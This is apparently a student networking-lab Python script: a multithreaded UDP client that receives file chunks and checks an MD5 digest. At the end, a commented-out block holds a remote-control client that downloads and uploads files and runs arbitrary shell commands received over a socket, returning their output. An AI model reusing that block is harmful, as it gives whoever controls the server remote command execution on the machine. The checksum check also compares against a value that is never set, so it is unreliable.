#!/usr/bin/env python3
import subprocess, socket, os
import threading
import time, sys
import hashlib
import logging, datetime


# IP y Port
from interfaceClient import *

HOST2 = "192.168.0.75"
HOST = "192.168.0.3"
PORT = 5001
# Configure conexion de sockets

numThreads = 0  #Number of clients
route = ""  #file path
digest= 0    #the checksum
threads = []  # lista de threads
ports=[]    #client ports

def get_checksum(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    f.close()
    return hash_md5.digest()
lock1 = threading.Lock()
class ClientThread(threading.Thread):

    def __init__(self, portRef):
        threading.Thread.__init__(self)
        self.digest=digest
        self.clientSock = 0
        self.data = 0
        self.clientAddr = 0
        self.clientPort = PORT + portRef
        self.addr=(HOST, self.clientPort)
        self.serverAddr=(HOST, self.clientPort - 1000)
        self.digestLocal=0
        self.filePath=""
        self.portRef= portRef

    def getport(self):
        return self.clientPort

    def makeSockClient(self):
        try:
            threads.append(self)
            self.clientSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            print("+ + + + + + + + + +")
            print("Client socket initialized")
            print('> New Connection: ' + str(HOST) + ' (' + str(self.clientPort) + ') ' + str(len(threads)) + ' times.')
            print("puerto ^ ", self.clientPort, "index ", self.clientPort-4000 , "\n")
            ports.append(self.clientAddr)
        except socket.error:
            print("Failed to create socket")
            sys.exit()


    def sendHowdy(self):
        howdy="Howdy"
        msg= howdy.encode('utf8')
        print("Howdy senttt")
        self.clientSock.sendto(msg, self.serverAddr)

    def recvEverything(self):
        #BigC = open(os.path.basename(".\ArchivosRecibidos\Cliente" + self.portRef + "-Prueba-"+ numThreads+".txt"), "wb")
        self.filePath=".\ArchivosRecibidos\Cliente" + str(self.portRef+1) + "-Prueba-" + str(numThreads) + ".txt"
        BigC = open(self.filePath,"wb")
        d = 0

        print("a ver")
        #recibiendo el total de paquetes que piensa enviar el server
        #self.clientSock.bind(self.addr)
        packetTotal,serverAddr= self.clientSock.recvfrom(4096)
        print(packetTotal, "The packet numba")
        print("all working for server: ",self.clientPort-PORT)
        try:

            if (self.clientPort-1000) == self.clientPort:
                print("all working for client: ", self.clientPort - PORT)
        except ValueError:

            print('> BRUH THAT NOT THE PORT\n')

            pass

        tillC = packetTotal.decode('utf8')
        tillCC = int(tillC)
        print(tillCC, " number of paquets")

        #recibiendo paquetes (numero es tillCC
        while tillCC != 0:
            filechunk, clientbAddr = self.clientSock.recvfrom(4096)
            dataS = BigC.write(filechunk)
            d += 1
            tillCC = tillCC - 1
        BigC.close()

    def verifyCheckSum(self):
        self.digestLocal=get_checksum(self.filePath)
        if self.digestLocal == digest:
            return True

    def run(self):
        print("making socket")
        with lock1:
            self.makeSockClient()
            self.sendHowdy()
            print("Receiving Files")
        self.recvEverything()
        if self.verifyCheckSum():
            print("Files received succesfully in directory ArchivosRecibidos")
        else:
            print("File is incomplete")



#Se debe, crear los Threads, crear los sockets, hacer el address,
# mandar howdy al puerto correspondiente, recibir el numero de paquetes, guardarlo, recibir el monton de chunks en un while y recibir el digest
#hacer el digest de lo recibido y ver que sea igual

while True:
#.\Files\Test1.txt
    try:
        Refresh(ports)
        time.sleep(4)
    except KeyboardInterrupt:
        numClient = int(input("Enter number of clients: "))
        numThreads = numClient
        print("Buckle up...")
        time.sleep(2)
        for i in range(0,numThreads):
            #clientThread = threading.Thread("", i + PORT)
            clientThread = ClientThread(i)
            time.sleep(0.3)
            clientThread.start()

        print("---------------------------")
        print("Press ENTER key to Continue\n")
        input()


    # #############################################################################

"""
while True:
    Data = z.recv(1024)
    try:
        decrypted = decryptData(Data)
    except ValueError:
        pass
    # si se recive un port nuevo, hacer conexion
    if decrypted[:4] == "port":
        z.shutdown(socket.SHUT_RDWR)
        z.close() 
        time.sleep(4)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = int(decrypted[5:])
        s.connect((HOST, port))

        sendData(s, "> I'm connected on port: " + str(decrypted[5:]) + "\n")
        while True:
            data = s.recv(1024)
            try:
                decrypted = decryptData(data)
            except ValueError:
                pass
            # salir del programa
            if decrypted == "quit":
                sys.exit()
            # Cambiar directorio
            elif decrypted[:2] == "cd":
                try:
                    os.chdir(decrypted[3:])
                except:
                    pass
                s.sendall(encryptData('EOFX'))
            # Encriptar o Decriptar un archivo
            elif decrypted[:12] == "encryptfile " or decrypted[:12] == "decryptfile ":
                try:
                    args = dict(e.split('=') for e in decrypted[12:].split(', '))
                    if len(args['pass']) and len(args['file']):
                        pass
                    else:
                        args = 0
                except:
                    args = 0
                    sendData(s,
                             '> Error: invalid arguments.\nUsage: encryptfile pass=desired password, file=this song.mp3\n\nUsage: decryptfile pass=desired password, file=this song.mp3\n')
                if args:
                    if decrypted[:12] == "encryptfile ": sendData(s, encryptFile(args['pass'], args['file']))
                    if decrypted[:12] == "decryptfile ": sendData(s, decryptFile(args['pass'], args['file']))
            # Enviar informacion al servidor
            elif decrypted[:8] == "download":
                try:
                    if os.path.isfile(decrypted[9:]):
                        filemsg = sendFile(s, decrypted[9:])
                        time.sleep(1)
                        sendData(s, filemsg)
                except:
                    sendData(s, '> Error: file not found.\n')
            # Descargar informacion del servidor
            elif decrypted[:10] == 'uploadConf':
                LOG_FILENAME = datetime.datetime.now().strftime("Logs\%Y-%m-%d-%H-%M-%S-log.txt")
                logging.basicConfig(filename=LOG_FILENAME, filemode='w', format='%(asctime)s - %(message)s',
                                    level=logging.INFO)
                var1 = 10
                numberid = ''
                totalid = ''
                while decrypted[var1] != '#':
                    numberid += decrypted[var1]
                    var1 += 1
                var1 += 1
                while decrypted[var1] != '#':
                    totalid += decrypted[var1]
                    var1 += 1
                print("Click Enter si esta listo para la descarga")
                print("Descarga Comienza")
                try:
                    g = open(os.path.basename('.\Cliente' + str(numberid) + '-Prueba-' + str(totalid) + '.txt'), 'wb')
                    s.settimeout(60)
                    while True:
                        l = s.recv(1024)
                        try:
                            if l.decode().endswith('EOFX') == True: break
                        except:
                            pass
                        g.write(l)
                    g.close()
                    s.sendall(encryptData('EOFX'))
                    s.settimeout(None)
                except:
                    sendData(s, '> Error receiving file.')
                    s.settimeout(None)
                os.replace('.\Cliente' + str(numberid) + '-Prueba-' + str(totalid) + '.txt',
                           '.\ArchivosRecibidos\Cliente' + str(numberid) + '-Prueba-' + str(totalid) + '.txt')
                sha1 = sha256File('.\ArchivosRecibidos\Cliente' + str(numberid) + '-Prueba-' + str(totalid) + '.txt')
                sha2r = open('.\sha256.txt', 'r')
                sha2 = sha2r.read()
                sha2r.close()
                try:
                    time.sleep(5)
                except:
                    pass
                if sha1 == sha2:
                    print('El documento recivido coincide con el hash')
                    s.sendall(encryptData('Exito\nEOFX'))
                else:
                    print("El documento ha sido corrumpido, toca descargarlo de nuevo")
                    s.sendall(encryptData('No Exitoso\nEOFX'))
            elif decrypted[:6] == 'upload':
                try:
                    g = open(os.path.basename(decrypted[7:]), 'wb')
                    s.settimeout(60)
                    while True:
                        l = s.recv(1024)
                        try:
                            if l.decode().endswith('EOFX') == True: break
                        except:
                            pass
                        g.write(l)
                    g.close()
                    s.sendall(encryptData('EOFX'))
                    s.settimeout(None)
                except:
                    sendData(s, '> Error receiving file.')
                    s.settimeout(None)
            # Otros comandos y envio de info
            else:
                proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdoutput = proc.stdout.read() + proc.stderr.read()
                sendmsg = str(stdoutput.decode("charmap"))
                sendData(s, sendmsg)

# Fin del loop
s.close()
"""